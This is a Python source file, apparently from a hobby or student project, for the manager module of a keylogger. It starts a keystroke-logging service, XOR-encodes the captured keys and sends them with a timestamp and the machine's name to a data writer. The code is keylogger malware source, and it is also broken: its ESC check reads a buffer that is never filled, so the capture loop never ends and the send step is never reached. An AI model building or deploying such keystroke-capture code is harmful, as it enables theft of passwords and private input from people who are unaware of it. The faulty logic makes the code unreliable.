import datetime
import time
import json
import os
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer

class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.to_encrypt = []
        self.config = self.load_config()

    def load_config(self):
        try:
            with open("config.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            # ברירת מחדל אם אין קובץ הגדרות
            return {
                "machine_name": "unknown",
                "machine_ip": "127.0.0.1"
            }

    def manager(self):
        new_keys = -1
        service.start_logging()
        end = False
        while not end:
            new_keys = service.get_logged_keys()
            if new_keys and "<ESC>" in self.buffer:
                end = True
            time.sleep(5)
        if new_keys:
            timestamp = str(datetime.datetime.now())

            encrypted_keys = []
            for char in new_keys:
                encrypted_keys.append(encryptor.ascii_xor(char))

            content = {timestamp: encrypted_keys}
            machine_name = self.config.get("machine_name", "unknown")
            file_writer.send_data(content, machine_name)

            service.logged_keys = []



if __name__ == "__main__":
    print("keylogger start to run, for stop press ESC")
    manager = KeyLoggerManager()
    manager.manager()

